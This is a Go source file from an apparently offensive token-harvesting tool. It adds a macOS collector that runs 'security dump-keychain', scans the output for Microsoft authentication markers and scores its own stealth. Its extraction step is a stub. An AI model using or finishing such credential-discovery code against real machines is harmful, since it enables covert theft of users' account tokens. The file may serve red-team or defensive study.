//go:build darwin

package microsoft

import (
	"context"
	"fmt"
	"os/exec"
	"strings"
	"time"

	"github.com/ninken/ninloader-go/internal/collector"
	"github.com/ninken/ninloader-go/internal/registry"
	"github.com/ninken/ninloader-go/internal/types"
)

func init() {
	registry.Register("microsoft", "keychain", func() collector.Collector {
		return &KeychainCollector{BaseCollector: collector.BaseCollector{Svc: "microsoft", Src: "keychain", Plats: []string{"darwin"}}}
	})
}

// KeychainCollector discovers Microsoft tokens in macOS Keychain via the security CLI.
type KeychainCollector struct {
	collector.BaseCollector
}

func (c *KeychainCollector) Service() string    { return c.Svc }
func (c *KeychainCollector) Source() string      { return c.Src }
func (c *KeychainCollector) StealthScore() int   { return 4 }
func (c *KeychainCollector) Platforms() []string { return c.Plats }

func (c *KeychainCollector) Discover() []*types.DiscoveredToken {
	var results []*types.DiscoveredToken

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "security", "dump-keychain")
	out, err := cmd.Output()
	if err != nil {
		c.Warn(fmt.Sprintf("Could not query keychain: %v", err))
		return nil
	}

	output := strings.ToLower(string(out))
	msPatterns := []string{"com.microsoft", "microsoftonline", "login.windows.net", "msal"}

	for _, pattern := range msPatterns {
		if strings.Contains(output, pattern) {
			results = append(results, &types.DiscoveredToken{
				Service:      c.Svc,
				Source:       c.Src,
				StealthScore: c.StealthScore(),
				Details:      fmt.Sprintf("Keychain entry matching '%s' found", pattern),
			})
			break
		}
	}

	return results
}

func (c *KeychainCollector) Collect() []*types.CollectedToken {
	c.Warn("Keychain token extraction not yet implemented — requires user approval dialog")
	return nil
}
